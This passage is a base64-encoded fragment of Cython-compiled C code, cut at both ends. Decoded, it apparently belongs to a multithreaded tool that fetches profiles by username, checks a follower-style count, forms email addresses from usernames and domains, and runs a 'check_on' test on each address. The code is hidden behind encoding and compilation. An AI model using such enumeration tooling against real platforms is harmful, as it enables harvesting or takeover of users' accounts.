HlNZXRob2RfR0VUX1NFTEYoX19weXhfdF84KTtcbiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzgpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF84LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICB9XG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdF8xMX07XG4gICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDMtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfcnIsIF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQzNSwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDM1LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2Zvd3MsIF9fcHl4X3RfOCk7XG4gICAgICAgICAgX19weXhfdF84ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICAgIF9fcHl4X3RfOCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfZm93cywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzAsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MzYsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF84KTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEzIDwgMCkpKSBfX1BZWF9FUlIoMCwgNDM2LCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgICBpZiAoX19weXhfdF8xMykge1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgIF9fcHl4X3RfOCA9IFB5TnVtYmVyX0FkZChfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2RvbWFpbik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQzNywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfZW1haWwsIF9fcHl4X3RfOCk7XG4gICAgICAgICAgICBfX3B5eF90XzggPSAwO1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICAgIF9fcHl4X3RfNSA9IE5VTEw7XG4gICAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVja19vbik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzExKSkpIHtcbiAgICAgICAgICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMSk7XG4gICAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMSwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF92X2VtYWlsfTtcbiAgICAgICAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgICAgICAgICBcbiAgICAgICAgICB9XG4gICAgICAgIH1cblxuICAgICAgICBcbiAgICAgIH1cbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7XG4gICAgICBfX3B5eF9MNV9lcnJvcjo7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTtcbiAgICAgIGlmIChfX3B5eF90XzE0KSB7XG4gICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygib3AudXV1IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfOCwgJl9fcHl4X3RfMTEsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDQ0MCwgX19weXhfTDdfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzExO1xuICAgICAgICAge1xuICAgICAgICB9XG4gICAgICAgICB7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0wyMjtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfTDIyOjtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDZfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICB9XG4gICAgICBnb3RvIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcjtcblxuICAgICAgXG4gICAgICBfX3B5eF9MN19leGNlcHRfZXJyb3I6O1xuICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgICBnb3RvIF9fcHl4X0wxX2Vycm9yO1xuICAgICAgX19weXhfTDZfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgICBfX3B5eF9MMTJfdHJ5X2VuZDo7XG4gICAgfVxuICB9XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AudXV1IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9kb21haW4pO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3Zfcm5kKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJfYWdlbnQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSWQpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbHNkKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl91c2VybmFtZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9ycik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mb3dzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VtYWlsKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X2diXzJvcF8zdXV1XzJnZW5lcmF0b3IzKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMjFwcmludGluZyhQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yb3BfMjFwcmludGluZyA9IHsicHJpbnRpbmciLCAoUHlDRnVuY3Rpb24pX19weXhfcHdfMm9wXzIxcHJpbnRpbmcsIE1FVEhfTk9BUkdTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzIxcHJpbnRpbmcoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCkge1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInByaW50aW5nICh3cmFwcGVyKSIsIDApO1xuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICBfX3B5eF9yID0gX19weXhfcGZfMm9wXzIwcHJpbnRpbmcoX19weXhfc2VsZik7XG5cbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yb3BfMjBwcmludGluZyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7XG4gIENZVEhPTl9VTlVTRUQgbG9uZyBfX3B5eF92X2k7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3QgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIGxvbmcgX19weXhfdF8xO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfNjtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIGludCBfX3B5eF90Xzg7XG4gIFB5X3NzaXplX3QgX19weXhfdF85O1xuICBQeU9iamVjdCAqKCpfX3B5eF90XzEwKShQeU9iamVjdCAqKTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicHJpbnRpbmciLCAwKTtcblxuICBcbiAgZm9yIChfX3B5eF90XzEgPSAwOyBfX3B5eF90XzEgPCAweDc4OyBfX3B5eF90XzErPTEpIHtcbiAgICBfX3B5eF92X2kgPSBfX3B5eF90XzE7XG5cbiAgICBcbiAgICBfX3B5eF90XzMgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDUwLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RocmVhZCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ1MCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dXUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NTAsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICAgIGFzc2VydChfX3B5eF90XzMpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF82ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF8zLCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQ1MCwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RhcmdldCwgX19weXhfdF80LCBfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzKzEsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDUwLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF83KTtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ1MCwgX19weXhfTDFfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl90LCBfX3B5eF90XzIpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzUgPSBfX3B5eF92X3Q7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF82ID0gMDtcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTtcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGFydCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NTEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgfVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgXG4gICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJlYWRzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDUyLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9BcHBlbmQoX19weXhfdF8yLCBfX3B5eF92X3QpOyBpZiAodW5saWtlbHkoX19weXhfdF84ID09ICgoaW50KS0xKSkpIF9fUFlYX0VSUigwLCA0NTIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICB9XG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfMikpIHx8IFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF90XzIpKSB7XG4gICAgX19weXhfdF81ID0gX19weXhfdF8yOyBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICBfX3B5eF90XzkgPSAwO1xuICAgIF9fcHl4X3RfMTAgPSBOVUxMO1xuICB9IGVsc2Uge1xuICAgIF9fcHl4X3RfOSA9IC0xOyBfX3B5eF90XzUgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF8xMCA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA0NTQsIF9fcHl4X0wxX2Vycm9yKVxuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICBmb3IgKDs7KSB7XG4gICAgaWYgKGxpa2VseSghX19weXhfdF8xMCkpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF81KSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzUpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCA0NTQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzkgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF81LCBfX3B5eF90XzkpO1xuICAgICAgICArK19fcHl4X3RfOTtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfNSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDQ1NCwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfOSA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ